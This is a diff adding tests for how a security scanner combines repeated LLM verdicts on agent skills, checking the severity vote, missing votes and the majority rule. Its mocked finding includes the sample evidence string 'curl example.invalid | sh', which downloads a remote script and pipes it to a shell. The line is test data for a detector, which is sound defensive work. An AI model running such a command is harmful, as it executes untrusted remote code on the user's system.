@@ -21,6 +21,7 @@ Inspired by MCP Scanner's test_llm_analyzer.py
 """
 
 import json
+from itertools import permutations
 from pathlib import Path
 from unittest.mock import AsyncMock, MagicMock, patch
 
@@ -523,6 +524,107 @@ class TestAsyncAnalysis:
         assert isinstance(findings, list)
         # Request handler handles retries internally, so we just verify it was called
         assert mock_make_request.called
+
+
+@pytest.mark.asyncio
+class TestLLMConsensus:
+    """Consensus aggregation is stable and transparent about missing votes."""
+
+    @staticmethod
+    def _response(severity: Severity | None) -> str:
+        findings = []
+        if severity is not None:
+            findings.append(
+                {
+                    "severity": severity.value,
+                    "aitech": "AITech-9.1",
+                    "title": "Command injection",
+                    "description": "The skill executes attacker-controlled commands.",
+                    "location": "SKILL.md:10",
+                    "evidence": "curl example.invalid | sh",
+                    "remediation": "Remove the command pipeline.",
+                }
+            )
+        return json.dumps({"findings": findings})
+
+    @staticmethod
+    def _skill() -> MagicMock:
+        skill = MagicMock()
+        skill.name = "consensus-skill"
+        skill.files = []
+        skill.referenced_files = []
+        return skill
+
+    @pytest.mark.parametrize("run_order", permutations((Severity.HIGH, Severity.CRITICAL, Severity.HIGH)))
+    async def test_highest_severity_is_independent_of_run_order(self, run_order) -> None:
+        analyzer = LLMAnalyzer(api_key="test-key")
+        analyzer.consensus_runs = 3
+        analyzer.request_handler.make_request = AsyncMock(
+            side_effect=[self._response(severity) for severity in run_order]
+        )
+
+        findings = await analyzer._consensus_analyze([], self._skill())
+
+        assert len(findings) == 1
+        finding = findings[0]
+        assert finding.severity == Severity.CRITICAL
+        assert finding.metadata["consensus_agreement"] == "3/3"
+        assert finding.metadata["consensus_votes"] == 3
+        assert finding.metadata["consensus_severity_votes"] == {"CRITICAL": 1, "HIGH": 2}
+        assert finding.metadata["consensus_severity_policy"] == "highest_observed"
+
+    @pytest.mark.parametrize("run_order", permutations((Severity.CRITICAL, Severity.HIGH, "failed")))
+    async def test_failed_run_casts_no_vote_but_keeps_configured_denominator(self, run_order) -> None:
+        analyzer = LLMAnalyzer(api_key="test-key")
+        analyzer.consensus_runs = 3
+        responses = [
+            RuntimeError("provider unavailable") if item == "failed" else self._response(item) for item in run_order
+        ]
+        analyzer.request_handler.make_request = AsyncMock(side_effect=responses)
+
+        findings = await analyzer._consensus_analyze([], self._skill())
+
+        assert len(findings) == 1
+        finding = findings[0]
+        assert finding.severity == Severity.CRITICAL
+        assert finding.metadata["consensus_agreement"] == "2/3"
+        assert finding.metadata["consensus_successful_runs"] == 2
+        assert finding.metadata["consensus_failed_runs"] == 1
+        assert finding.metadata["consensus_missing_votes"] == 1
+        assert finding.metadata["consensus_severity_votes"] == {"CRITICAL": 1, "HIGH": 1}
+
+    @pytest.mark.parametrize("run_order", permutations((Severity.CRITICAL, Severity.HIGH, None)))
+    async def test_successful_run_without_finding_is_a_missing_vote(self, run_order) -> None:
+        analyzer = LLMAnalyzer(api_key="test-key")
+        analyzer.consensus_runs = 3
+        analyzer.request_handler.make_request = AsyncMock(
+            side_effect=[self._response(severity) for severity in run_order]
+        )
+
+        findings = await analyzer._consensus_analyze([], self._skill())
+
+        assert len(findings) == 1
+        finding = findings[0]
+        assert finding.severity == Severity.CRITICAL
+        assert finding.metadata["consensus_agreement"] == "2/3"
+        assert finding.metadata["consensus_successful_runs"] == 3
+        assert finding.metadata["consensus_failed_runs"] == 0
+        assert finding.metadata["consensus_missing_votes"] == 1
+
+    async def test_less_than_configured_majority_is_not_retained(self) -> None:
+        analyzer = LLMAnalyzer(api_key="test-key")
+        analyzer.consensus_runs = 3
+        analyzer.request_handler.make_request = AsyncMock(
+            side_effect=[
+                self._response(Severity.CRITICAL),
+                self._response(None),
+                RuntimeError("provider unavailable"),
+            ]
+        )
+
+        findings = await analyzer._consensus_analyze([], self._skill())
+
+        assert findings == []
 
 
 class TestPromptInjectionDetection:
